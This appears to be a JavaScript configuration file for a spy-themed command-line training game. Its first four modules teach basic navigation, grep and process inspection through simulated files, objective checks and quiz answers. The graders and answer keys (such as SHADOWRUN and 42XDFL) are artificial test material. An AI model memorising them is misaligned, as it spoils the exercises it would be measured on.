/**
 * CLHConfig.js - Command Line Hacker Module Configuration Registry
 * Hexworth Prime - House of Script
 *
 * Central registry for all CLH course modules.
 * Each module defines its filesystem overlay, objectives, and metadata.
 *
 * Usage:
 *   const config = CLHConfig.getModule('CLH-002');
 *
 * Version: 1.0.0
 * Created: January 17, 2026
 */

const CLHConfig = (function() {
    'use strict';

    // ═══════════════════════════════════════════════════════════════
    // TIER DEFINITIONS
    // ═══════════════════════════════════════════════════════════════

    const TIERS = {
        'CLI Recruit': {
            modules: ['CLH-001', 'CLH-002', 'CLH-003'],
            badge: 'cli-recruit',
            description: 'Basic command line navigation'
        },
        'CLI Analyst': {
            modules: ['CLH-004', 'CLH-005', 'CLH-006'],
            badge: 'cli-analyst',
            description: 'Process and log analysis'
        },
        'CLI Operative': {
            modules: ['CLH-007', 'CLH-008', 'CLH-009'],
            badge: 'cli-operative',
            description: 'Permissions and scripting'
        },
        'CLI Shadow': {
            modules: ['CLH-010', 'CLH-011', 'CLH-012'],
            badge: 'cli-shadow',
            description: 'Network operations'
        },
        'CLI Phantom': {
            modules: ['CLH-013', 'CLH-014', 'CLH-015'],
            badge: 'cli-phantom',
            description: 'Advanced operations'
        },
        'CLI Specter': {
            modules: ['CLH-016', 'CLH-017', 'CLH-018', 'CLH-019', 'CLH-020', 'CLH-021', 'CLH-022'],
            badge: 'cli-specter',
            description: 'System reconnaissance and infiltration'
        },
        'CLI Wraith': {
            modules: ['CLH-023', 'CLH-024', 'CLH-025', 'CLH-026', 'CLH-027'],
            badge: 'cli-wraith',
            description: 'Persistence and privilege escalation'
        },
        'CLI Ghost': {
            modules: ['CLH-028', 'CLH-029', 'CLH-030'],
            badge: 'cli-ghost',
            description: 'Elite field operations'
        }
    };

    // ═══════════════════════════════════════════════════════════════
    // MODULE REGISTRY
    // ═══════════════════════════════════════════════════════════════

    const MODULES = {

        // ──────────────────────────────────────────────────────────
        // CLH-001: Introduction to the Command Line Interface
        // Theme: First contact with the hacker terminal
        // ──────────────────────────────────────────────────────────
        'CLH-001': {
            title: 'Introduction to Hacker CLI',
            description: 'Welcome to Command Line Hacker training. Learn basic reconnaissance commands.',
            prerequisites: [],  // No prerequisites - entry point
            tier: 'CLI Recruit',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,  // All commands allowed

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['Documents', 'missions', 'scripts', 'tools', '.bashrc', '.bash_history', '.classified', '.cli_cheatsheet']
                },
                '/home/operator/Documents': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: []
                },
                '/home/operator/missions': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'targets.txt', 'handler_notes.txt']
                },
                '/home/operator/missions/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `OPERATION: SILENT ECHO
Classification: TOP SECRET // NOFORN

Welcome to Command Line Hacker training, operative.

Your mission: Master the terminal interface. The command line
is your primary weapon in the field. GUI tools leave traces.
The terminal leaves only what you choose.

Complete all training modules to be assigned to active operations.

Handler: GHOSTWRITER
Comms Window: 0300-0500 UTC

"In the shadows, we type. In silence, we execute."
`
                },
                '/home/operator/missions/targets.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `[CLASSIFIED - LEVEL 4 CLEARANCE REQUIRED]

Target List - PENDING AUTHORIZATION

Complete CLI training modules 001-005 to unlock.

Current clearance: TRAINEE
Required clearance: ANALYST
`
                },
                '/home/operator/missions/handler_notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 289,
                    content: `HANDLER NOTES - For Trainee Eyes Only

Basic commands every operative must know:
- whoami: Verify your identity
- pwd: Know your position
- hostname: Identify the system
- ls: Survey your environment
- cd: Move through the filesystem
- cat: Read file contents

Start with reconnaissance. Always.
`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['recon.sh', 'exfil.sh']
                },
                '/home/operator/scripts/recon.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 198,
                    content: `#!/bin/bash
# RECON.SH - Basic reconnaissance script
# Author: GHOSTWRITER
# Classification: UNCLASSIFIED

echo "[*] Initiating recon..."
whoami
hostname
pwd
ls -la
echo "[*] Recon complete."
`
                },
                '/home/operator/scripts/exfil.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 87,
                    content: `#!/bin/bash
# EXFIL.SH - Data exfiltration template
# [REDACTED - Complete training to unlock]
`
                },
                '/home/operator/tools': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['nmap_results.txt']
                },
                '/home/operator/tools/nmap_results.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `# Nmap scan results - Training Lab
# Target: 10.0.0.0/24

Host: 10.0.0.1 (gateway)
  22/tcp   open  ssh
  80/tcp   open  http

Host: 10.0.0.42 (shadow)
  22/tcp   open  ssh
  3306/tcp open  mysql

[Scan truncated for training]
`
                },
                '/home/operator/.bashrc': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 145,
                    content: `# Operator shell config
export PS1="\\u@\\h:\\w\\$ "
alias ll='ls -la'
alias cls='clear'

# "The best hackers leave no trace."
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 89,
                    content: `whoami
pwd
hostname
ls
cat missions/handler_notes.txt
`
                },
                '/home/operator/.classified': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 201,
                    content: `ASSET CODENAMES - MEMORIZE AND DELETE

MOCKINGBIRD - Media contact (compromised)
RAVEN - Field operative, Berlin
PHOENIX - Extraction specialist
GHOST - You

Handler dead drop: 40.7128° N, 74.0060° W
Phrase: "The weather is nice in Prague"
`
                },
                '/home/operator/.cli_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `CLI BASICS - OPERATOR CHEATSHEET
==================================

IDENTITY & POSITION
  whoami          Show current username
  pwd             Print working directory (where you are)
  hostname        Show system hostname

RECONNAISSANCE
  ls              List directory contents
  ls -l           Long format (permissions, size, date)
  ls -a           Show hidden files (starting with .)
  ls -la          Both: long format + hidden files

NAVIGATION
  cd <dir>        Change to directory
  cd ..           Go up one level
  cd ~            Go to home directory
  cd              Same as cd ~ (go home)

FILE READING
  cat <file>      Display entire file contents
  head <file>     Show first 10 lines
  tail <file>     Show last 10 lines

PRO TIP: Hidden files start with a dot (.)
         Use ls -a to reveal them.

"First rule of reconnaissance: Know where you are."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Identify Operator',
                    hint: 'Identify your current user account: whoami',
                    check: (cmd, state, output) => cmd.trim() === 'whoami' &&
                        output && output.includes('operator')
                },
                {
                    id: 2,
                    task: 'RECON: Locate Position',
                    hint: 'Determine your filesystem position: pwd',
                    check: (cmd, state, output) => cmd.trim() === 'pwd' &&
                        output && output.includes('/home')
                },
                {
                    id: 3,
                    task: 'RECON: Identify Target System',
                    hint: 'Identify the hostname: hostname',
                    check: (cmd, state, output) => cmd.trim() === 'hostname' &&
                        output && output.includes('shadow')
                },
                {
                    id: 4,
                    task: 'SURVEY: Assess Environment',
                    hint: 'Survey your surroundings: ls',
                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
                        output && (output.includes('missions') || output.includes('Documents'))
                },
                {
                    id: 5,
                    task: 'EXTRACT: Read Intel',
                    hint: 'Read the handler notes: cat missions/handler_notes.txt',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('handler') &&
                        output && output.includes('whoami')
                },
            ],

            remoteHosts: null,  // No SSH targets in intro module
        },

        // ──────────────────────────────────────────────────────────
        // CLH-002: Navigation & Reconnaissance
        // Theme: Field operations reconnaissance mission
        // ──────────────────────────────────────────────────────────
        'CLH-002': {
            title: 'Navigation & Reconnaissance',
            description: 'Navigate the filesystem like a ghost. Map the territory and extract critical intel.',
            prerequisites: ['CLH-001'],
            tier: 'CLI Recruit',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                // Home directory structure
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['Documents', 'intel', 'scripts', 'logs', '.bash_history', '.bashrc', '.navigation_cheatsheet']
                },
                '/home/operator/Documents': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['notes.txt']
                },
                '/home/operator/Documents/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 40,
                    content: 'Meeting at 14:00 in the secure room.\n'
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'targets.txt', '.secret.txt', '.classified']
                },
                '/home/operator/intel/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `CLASSIFIED BRIEFING - OPERATION SHADOW
========================================

Mission: Establish secure access to target network
Status: ACTIVE

PRIMARY OBJECTIVES:
1. Map filesystem structure
2. Locate intel directories
3. Extract mission-critical data
4. Return to base undetected

Handler: PHOENIX
Clearance: LEVEL 3

Remember: Leave no trace.
`
                },
                '/home/operator/intel/targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `TARGET LIST
============
- Alpha Server (192.168.1.10)
- Beta Database (192.168.1.20)
- Gamma Comms (192.168.1.30)

Priority: HIGH
`
                },
                '/home/operator/intel/.secret.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 64,
                    content: 'The password to the vault is: SHADOWRUN\n'
                },
                '/home/operator/intel/.classified': {
                    type: 'dir',
                    perms: 'drwx------',
                    owner: 'operator',
                    group: 'operator',
                    children: ['eyes-only.txt']
                },
                '/home/operator/intel/.classified/eyes-only.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `TOP SECRET - EYES ONLY

Project LOOKING GLASS is compromised.
Trust no one from Division 7.

Coordinates: 47.6062° N, 122.3321° W
`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['backup.sh', 'scan.sh']
                },
                '/home/operator/scripts/backup.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 45,
                    content: '#!/bin/bash\ncp -r ~/intel ~/intel.bak\n'
                },
                '/home/operator/scripts/scan.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 38,
                    content: '#!/bin/bash\nls -la ~/intel\n'
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['access.log']
                },
                '/home/operator/logs/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 78,
                    content: '2024-01-15 08:23:11 - User login: operator\n2024-01-15 08:24:03 - Directory accessed: /intel\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 35,
                    content: `ls
cd intel
ls -la
cat briefing.txt
cd .classified
cat eyes-only.txt
cd ~
`
                },
                '/home/operator/.bashrc': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 24,
                    content: '# Operator shell config\n'
                },
                '/home/operator/.navigation_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `NAVIGATION - OPERATOR CHEATSHEET
==================================

MOVEMENT COMMANDS
  cd <dir>        Change to directory
  cd ..           Go up one directory
  cd ~            Go to home directory
  cd -            Go to previous directory
  cd              Same as cd ~ (go home)

RECONNAISSANCE
  ls              List directory contents
  ls -l           Long format (details)
  ls -a           Show hidden files (starting with .)
  ls -la          Both: details + hidden files
  ls -lah         Human-readable file sizes

PATH TYPES
  ./file          Relative path (current directory)
  ../file         Relative path (parent directory)
  ~/file          Home directory path
  /path/to/file   Absolute path (from root)

HIDDEN CONTENT
  - Files starting with . are hidden
  - Use ls -a to reveal them
  - Hidden directories can contain classified intel

PRO TIP: Good operatives always check for hidden files.
         The best intel is often in .secret locations.

"Move like a ghost. Leave no trace."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'SURVEY: Map the Territory',
                    hint: 'Use ls to survey your current location',
                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
                        output && (output.includes('intel') || output.includes('Documents'))
                },
                {
                    id: 2,
                    task: 'INFILTRATE: Enter Intel Directory',
                    hint: 'Navigate into the "intel" directory: cd intel',
                    check: (cmd, state) => state.currentDir.includes('intel')
                },
                {
                    id: 3,
                    task: 'SCAN: Deep Reconnaissance',
                    hint: 'Reveal hidden files with: ls -la',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-') &&
                        (cmd.includes('l') && cmd.includes('a')) &&
                        output && (output.includes('.secret') || output.includes('.classified'))
                },
                {
                    id: 4,
                    task: 'EXTRACT: Read the Briefing',
                    hint: 'Access the briefing.txt file: cat briefing.txt',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('briefing') &&
                        output && output.includes('OPERATION SHADOW')
                },
                {
                    id: 5,
                    task: 'EXFIL: Return to Base',
                    hint: 'Navigate back to home: cd ~ (or cd)',
                    check: (cmd, state) => state.currentDir === '/home/operator'
                },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the password to the vault?",
                hint: "Look for hidden files in the intel directory. Secrets hide in the shadows.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['SHADOWRUN', 'shadowrun', 'Shadowrun'],
                correctAnswerMessage: 'Intel confirmed. Vault access granted — credentials authenticated.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-003: Pattern Hunting
        // Theme: UFO incident report with hidden secret code
        // ──────────────────────────────────────────────────────────
        'CLH-003': {
            title: 'Pattern Hunting',
            description: 'Use grep to find needles in haystacks. A secret code is hidden in the evidence.',
            prerequisites: ['CLH-002'],
            tier: 'CLI Recruit',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,
            secretCode: '42XDFL',  // Secret code to find

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['evidence', 'tools', 'reports', '.bash_history', '.grep_cheatsheet']
                },
                '/home/operator/evidence': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mystery.txt', 'notes.txt', 'README.txt', 'witness_reports.txt', 'timeline.txt']
                },
                '/home/operator/evidence/mystery.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 2048,
                    content: `CLASSIFIED INCIDENT REPORT - CASE FILE #2847
============================================
Date: November 12, 2025
Location: Rural Nevada, 37.2431N 115.7930W
Reporting Agent: Field Officer Martinez

SUMMARY OF EVENTS:
At approximately 0247 hours, multiple witnesses reported unusual
aerial phenomena near the restricted airspace perimeter. Radar
contact confirmed an unidentified craft traveling at impossible
speeds - estimated 4,700 knots with instantaneous direction changes.

WITNESS TESTIMONY (REDACTED):
"The light just appeared out of nowhere. It wasn't like a plane
or helicopter. It moved in ways that don't make sense. Then it
just stopped, hovering maybe 200 feet above the treeline."

ABDUCTION INCIDENT:
Subject: [REDACTED] - Local rancher, age 47
Duration: Approximately 3 hours 17 minutes of missing time
Subject reports: Paralysis, bright examination room, non-human
entities approximately 4 feet tall with elongated craniums.
Medical examination revealed unexplained scarring and elevated
radiation levels. Subject's GPS tracker data shows impossible
location jump of 127 miles during the missing time window.

PHYSICAL EVIDENCE RECOVERED:
- Soil samples show vitrification consistent with extreme heat
- Unusual metallic fragments (analysis pending)
- Cattle mutilation discovered 0.3 miles from primary site
Secret Code: 42XDFL
SIGNAL INTERCEPT:
NSA listening post captured burst transmission during event.
Frequency: 1420.405 MHz (hydrogen line - significant)
Pattern analysis suggests non-random, possibly encoded message.

CONCLUSION:
This incident is classified TIER-3 UNEXPLAINED. All witnesses
have been debriefed and signed non-disclosure agreements.
Local law enforcement redirected with cover story (military
training exercise). Recommend continued monitoring of subject
for potential recontact scenario.

END REPORT
[EYES ONLY - UNAUTHORIZED ACCESS PROHIBITED]`
                },
                '/home/operator/evidence/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: 'Case #2847\nSuspect communications intercepted.\nEvidence stored in mystery.txt\nAnalyst notes: Look for patterns.\n'
                },
                '/home/operator/evidence/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 163,
                    content: 'EVIDENCE DIRECTORY\n==================\nFiles in this directory are part of ongoing investigation.\nUse grep to search for patterns.\nDo not modify original evidence.\n'
                },
                '/home/operator/evidence/witness_reports.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `WITNESS STATEMENTS - CASE #2847
================================

WITNESS A (Rancher):
"I was checking the cattle around 0230 when I saw the light.
It was bright, almost blinding. The cattle were spooked.
I lost about three hours - don't remember anything."

WITNESS B (Highway Patrol):
"Dispatch received multiple 911 calls about lights in the sky.
When I arrived at the location, there was nothing but a
burned patch in the field. My radio went dead for 20 minutes."

WITNESS C (Pilot):
"I was at 15,000 feet when something passed me doing
impossible maneuvers. No aircraft I know can move like that.
FAA has no record of any traffic in that sector."

All witnesses passed polygraph examination.
`
                },
                '/home/operator/evidence/timeline.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `INCIDENT TIMELINE - CASE #2847
===============================
0215 - First radar contact
0230 - Witness A reports light
0235 - 911 calls begin
0247 - Peak activity recorded
0300 - Subject missing time begins
0315 - Military assets scrambled
0330 - FAA communication blackout
0400 - Object disappears from radar
0603 - Subject found confused in field
0800 - Evidence collection begins
1200 - Site secured and classified

Total duration of event: ~4 hours
`
                },
                '/home/operator/tools': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['search.sh']
                },
                '/home/operator/tools/search.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 54,
                    content: '#!/bin/bash\n# Quick search script\ngrep -rn "$1" ./evidence/\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 34,
                    content: `ls evidence/
cat evidence/mystery.txt
grep Secret evidence/mystery.txt
grep "Secret Code" evidence/mystery.txt
grep -n "Secret Code" evidence/mystery.txt
grep -i witness evidence/
`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: 'REPORTS DIRECTORY\n=================\nSave your grep output here using redirection:\ngrep "pattern" file > reports/findings.txt\n'
                },
                '/home/operator/.grep_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `GREP - PATTERN HUNTING CHEATSHEET
===================================

BASIC USAGE
  grep "pattern" file       Search for pattern in file
  grep "pattern" dir/*      Search in all files in directory

USEFUL FLAGS
  -i          Case insensitive search
  -n          Show line numbers
  -c          Count matching lines
  -v          Invert match (show non-matching)
  -r          Recursive (search subdirectories)
  -l          List only filenames with matches
  -w          Match whole words only

PATTERN EXAMPLES
  grep "error" log.txt          Find "error" in log.txt
  grep -i "secret" *.txt        Case-insensitive in all .txt
  grep -n "code" evidence/*     Show line numbers
  grep -rn "pattern" ./         Recursive with line numbers

COMBINING FLAGS
  grep -in "pattern" file       Case-insensitive + line numbers
  grep -rn "pattern" dir/       Recursive + line numbers
  grep -c "pattern" file        Just count matches

PRO TIP: Wrap patterns with spaces in quotes.
         grep "Secret Code" is different from grep Secret Code

"Find the pattern. Extract the truth."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Survey the Evidence',
                    hint: 'Examine the evidence directory: ls evidence/',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('evidence') &&
                        output && (output.includes('mystery') || output.includes('notes'))
                },
                {
                    id: 2,
                    task: 'INTEL: Examine the Target File',
                    hint: 'Preview mystery.txt: cat evidence/mystery.txt',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('mystery') &&
                        output && output.includes('CLASSIFIED')
                },
                {
                    id: 3,
                    task: 'HUNT: Search for "Secret"',
                    hint: 'Use grep to find lines with "Secret"',
                    check: (cmd, state, output) => cmd.includes('grep') &&
                        (cmd.includes('Secret') || cmd.includes('secret')) &&
                        output && output.includes('Secret')
                },
                {
                    id: 4,
                    task: 'EXTRACT: Find the Code Pattern',
                    hint: 'Search for "Secret Code": grep "Secret Code" evidence/mystery.txt',
                    check: (cmd, state, output) => output && output.includes('42XDFL')
                },
                {
                    id: 5,
                    task: 'VERIFY: Confirm with Line Number',
                    hint: 'Document with line numbers: grep -n "Secret Code" evidence/mystery.txt',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-n') &&
                        output && /^\d+:/.test(output.trim())
                },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the secret code hidden in the evidence?",
                hint: "Use grep to search for 'Secret Code' in the mystery.txt file.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['42XDFL', '42xdfl'],
                correctAnswerMessage: 'Intel confirmed. Secret code 42XDFL verified — evidence logged.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-004: Process Investigation
        // Theme: Black site monitoring station, threat hunting
        // ──────────────────────────────────────────────────────────
        'CLH-004': {
            title: 'Process Investigation',
            description: 'Monitor running processes. Something is always watching.',
            prerequisites: ['CLH-003'],
            tier: 'CLI Analyst',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['analysis', 'tools', 'reports', '.bash_history', '.process_cheatsheet']
                },
                '/home/operator/analysis': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['processes.txt', 'README.txt', 'baseline.txt', '.incident_log']
                },
                '/home/operator/analysis/processes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `PID     CPU%    MEM%    PROCESS
1       0.0     0.1     systemd
2       0.0     0.0     kthreadd
127     0.1     0.2     sshd
256     0.3     1.2     signal_intercept
312     0.2     0.8     postgres
445     1.2     2.1     facial_recog_daemon
512     0.1     0.3     cron
623     8.2     5.1     unknown_process
789     0.4     1.5     sat_uplink_monitor
834     0.2     0.6     redis-server
901     0.1     0.4     drone_telemetry
945     0.3     0.9     mysql
1024    0.0     0.2     comms_logger
1156    0.1     0.3     perimeter_sensor`
                },
                '/home/operator/analysis/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `BLACK SITE MONITORING STATION - INCIDENT REPORT
================================================
Facility: [REDACTED] - Codename "SHADOW MESA"
Process snapshot captured: 2024-01-15 14:32:07 UTC
Alert triggered by: Anomalous CPU usage spike
Analyst assigned: operator

SITUATION:
Perimeter breach detected 0300 hours. Unknown entity
gained access to monitoring subnet. One unauthorized
process now running on primary analysis server.

PRIORITY: CRITICAL
Find and document the rogue process before it
exfiltrates satellite telemetry data.
`
                },
                '/home/operator/analysis/baseline.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `APPROVED PROCESS BASELINE - CLEARANCE LEVEL 4
==============================================
systemd, kthreadd, sshd, signal_intercept, postgres,
facial_recog_daemon, cron, sat_uplink_monitor,
redis-server, drone_telemetry, mysql, comms_logger,
perimeter_sensor

WARNING: Any process NOT in this list is potentially
hostile and should be flagged for immediate review.
`
                },
                '/home/operator/analysis/.incident_log': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `[0247] Perimeter alarm triggered - Sector 7G
[0251] Guards dispatched - found nothing
[0303] Anomalous network traffic detected
[0315] Unknown process spawned - PID 623
[0332] Process snapshot captured for analysis
[0340] You are now investigating...
`
                },
                '/home/operator/tools': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['hunt.sh']
                },
                '/home/operator/tools/hunt.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: '#!/bin/bash\n# Process hunting script\ngrep -v "^PID" "$1" | sort -k2 -rn | head -5\necho "Top 5 CPU consumers listed"\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 42,
                    content: `ls
cd analysis
cat processes.txt
cat baseline.txt
grep unknown processes.txt
grep "8.2" processes.txt
cat .incident_log
`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: 'REPORTS DIRECTORY\n=================\nDocument your findings here.\nUse redirection: grep pattern file > reports/findings.txt\n'
                },
                '/home/operator/.process_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `PROCESS INVESTIGATION - OPERATOR CHEATSHEET
=============================================

PROCESS MONITORING
  ps                 List your processes
  ps aux             List ALL processes (detailed)
  ps -ef             List ALL processes (full format)
  top                Interactive process viewer (q to quit)

PROCESS ANALYSIS
  ps aux | grep name     Find specific process
  ps aux | sort -k3 -rn  Sort by CPU (column 3)
  ps aux | sort -k4 -rn  Sort by memory (column 4)

THREAT HUNTING
  1. Get baseline of normal processes
  2. Compare current snapshot to baseline
  3. Look for unknown or suspicious names
  4. Check for high CPU/memory usage
  5. Investigate PIDs not in baseline

READING PROCESS OUTPUT
  PID   - Process ID (unique identifier)
  CPU%  - CPU usage percentage
  MEM%  - Memory usage percentage

SUSPICIOUS INDICATORS
  - Unknown process names
  - High CPU with no explanation
  - Processes not in baseline
  - Random alphanumeric names

"Trust nothing. Verify everything."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Locate Analysis Data',
                    hint: 'Survey your environment: ls',
                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
                        output && (output.includes('analysis') || output.includes('tools'))
                },
                {
                    id: 2,
                    task: 'INFILTRATE: Enter Analysis Directory',
                    hint: 'Navigate to analysis: cd analysis',
                    check: (cmd, state) => state.currentDir.includes('/analysis')
                },
                {
                    id: 3,
                    task: 'INTEL: Review Process Snapshot',
                    hint: 'Read the process list: cat processes.txt',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('processes') &&
                        output && output.includes('PID')
                },
                {
                    id: 4,
                    task: 'HUNT: Identify the Rogue Process',
                    hint: 'Search for anomalies: grep "unknown" processes.txt',
                    check: (cmd, state, output) => output && output.includes('unknown_process')
                },
                {
                    id: 5,
                    task: 'VERIFY: Confirm by CPU Usage',
                    hint: 'Verify high CPU: grep "8.2" processes.txt',
                    check: (cmd, state, output) => cmd.includes('grep') && output && output.includes('8.2')
                },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the name of the unauthorized process?",
                hint: "Compare the process list to the baseline. What process is NOT approved?",
                hintAfterAttempts: 3,
                acceptedAnswers: ['unknown_process', 'Unknown_process', 'UNKNOWN_PROCESS'],
                correctAnswerMessage: 'Intel confirmed. Rogue process identified — initiating containment protocol.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

